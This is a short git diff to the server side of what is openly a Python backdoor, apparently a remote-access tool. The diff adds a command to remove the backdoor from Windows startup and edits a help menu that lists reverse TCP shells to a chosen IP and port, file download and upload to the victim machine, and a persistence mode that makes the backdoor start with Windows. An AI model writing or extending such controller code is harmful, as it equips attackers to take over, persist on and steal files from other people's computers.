@@ -188,8 +188,16 @@ class TcpServer:
 
                     if message_command == "permanence_mode":
                         self.client.send(message_command.encode())
-                        reg_message = self.client.recv(1024).decode()
+                        reg_message = self.client.recv(1024).decode("latin1")
                         print(reg_message)
+                        continue
+
+                    if message_command == "disable_permanence":
+                        self.client.send(message_command.encode())
+                        desativating_message = self.client.recv(1024).decode()
+                        print(desativating_message)
+                        desactivated = self.client.recv(1024)
+                        print(desactivated.decode())
                         continue
 
                     # Uploading FIles
@@ -285,7 +293,8 @@ class TcpServer:
             reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT
             download <file> --> Download files
             permamence_mode --> Make Backdoor to initiate in windows startup
-            upload <path> <filename>
+            disable_permanence --> Disable Backdoor in windows Startup
+            upload <path> <filename> --> upload files into client
             ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt \033[0;0m
             ---------------------------------------------            """)
                         continue
